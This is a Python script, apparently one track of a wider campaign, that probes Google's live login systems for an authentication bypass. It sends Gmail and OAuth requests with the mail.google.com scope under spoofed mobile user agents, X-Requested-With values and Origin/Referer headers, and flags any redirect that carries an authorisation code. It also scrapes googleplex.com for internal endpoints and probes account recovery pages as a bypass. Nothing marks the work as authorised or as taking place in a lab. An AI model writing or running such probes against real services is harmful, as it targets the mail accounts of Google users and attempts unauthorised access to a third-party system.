import requests, json, re

print('=== TRACK G: URL PROTOCOL / DEEP LINK BYPASS ===')

session = requests.Session()
session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})

# 1. Gmail with Android user agent
print('1. Android UA to Gmail')
ua_android = {'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36'}
r = session.get('https://mail.google.com/mail/', headers=ua_android, allow_redirects=True, timeout=10)
print(f'  HTTP {r.status_code} ({len(r.text)} bytes)')

# 2. Mobile-specific auth flows
print()
print('2. Mobile-specific auth flows')
uas = [
    'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
    'Dalvik/2.1.0 (Linux; U; Android 14; Pixel 8 Build/UD1A.230803.041)',
    'GoogleAuth/1.0',
]
base_url = 'https://accounts.google.com/o/oauth2/auth?response_type=code&client_id=77185425430.apps.googleusercontent.com&redirect_uri=http://localhost&scope=https://mail.google.com/&access_type=offline'
for ua in uas:
    s = requests.Session()
    s.headers.update({'User-Agent': ua})
    r = s.get(base_url, allow_redirects=False, timeout=10)
    loc = r.headers.get('Location', '')
    status = 'INTERESTING' if 'code=' in loc else ('LOGIN' if 'signin' in loc else str(r.status_code))
    print(f'  UA={ua[:50]}... -> HTTP {r.status_code} {status} loc={loc[:120]}')

# 3. X-Requested-With header (Android WebView auth)
print()
print('3. X-Requested-With header variations')
for xrw in ['com.google.android.gm', 'com.google.android.gms', 'com.android.chrome', '']:
    headers = {}
    if xrw:
        headers['X-Requested-With'] = xrw
    r = requests.get(base_url, headers=headers, allow_redirects=False, timeout=10)
    loc = r.headers.get('Location', '')
    print(f'  X-Requested-With={xrw} -> HTTP {r.status_code} loc={loc[:120]}')

# 4. Origin/Referer header manipulation
print()
print('4. Origin/Referer header variations')
origins = [
    'https://accounts.google.com',
    'https://mail.google.com',
    'https://www.googleapis.com',
    'https://android.clients.google.com',
    'null',
    'https://www.example.com',
]
for origin in origins:
    r = requests.get(base_url.replace('77185425430', '764086051850-6qr4p6gpi6hn506pt8ejuq83di341hur'), headers={'Origin': origin, 'Referer': origin+'/'}, allow_redirects=False, timeout=10)
    loc = r.headers.get('Location', '')
    if 'signin' not in loc and 'error' not in loc:
        print(f'  INTERESTING: Origin={origin[:40]} -> HTTP {r.status_code} {loc[:120]}')
    else:
        print(f'  Origin={origin[:40]} -> {r.status_code} (standard)')

print()
print('=== TRACK G2: GOOGLEPLEX INTERNAL PORTAL ===')
r = requests.get('https://googleplex.com/', timeout=10)
print(f'HTTP {r.status_code} ({len(r.text)} bytes)')
# Extract any internal endpoints or interesting content
for line in r.text.split('\n')[:30]:
    if 'href=' in line or 'src=' in line or 'action=' in line:
        line = line.strip()
        print(f'  {line[:150]}')

print()
print('=== TRACK G3: ACCOUNT RECOVERY BYPASS ===')
# The account recovery flow might have different auth requirements
recovery_urls = [
    'https://accounts.google.com/signin/recovery',
    'https://accounts.google.com/AccountRecovery',
    'https://accounts.google.com/ForgotPasswd',
    'https://accounts.google.com/RecoverAccount',
]
for url in recovery_urls:
    r = requests.get(url, timeout=10)
    print(f'  GET {url} -> HTTP {r.status_code} ({len(r.text)} bytes)')
    if r.status_code == 200:
        # Check if we can find the recovery email
        if 'Email' in r.text or 'email' in r.text or 'phone' in r.text:
            print(f'    Contains email/phone field - potential recovery probe')
